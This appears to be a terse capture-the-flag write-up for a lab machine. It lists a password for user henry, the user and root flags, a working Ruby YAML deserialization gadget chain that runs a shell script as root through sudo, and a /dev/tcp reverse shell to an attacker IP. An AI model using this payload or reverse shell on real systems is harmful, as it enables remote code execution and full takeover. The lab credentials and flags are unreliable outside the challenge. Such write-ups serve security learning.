
## USER

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
```


Password for henry:

```
Q3c1AqGHtoI0aXAYFH
```

User flag: `cc3cd41d874ebd05f7b7b7366abaaad1`

## ROOT

Try this vuln on dependencies.yml file and execute the command availabe with `sudo -l`
https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

root flag: `2ebe27d5c2f9d4e7a6c9ccd00a979626`

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: bash /home/henry/exploit.sh
         method_id: :resolve

```

```shell
sh -i >& /dev/tcp/10.10.14.38/9002 0>&1
```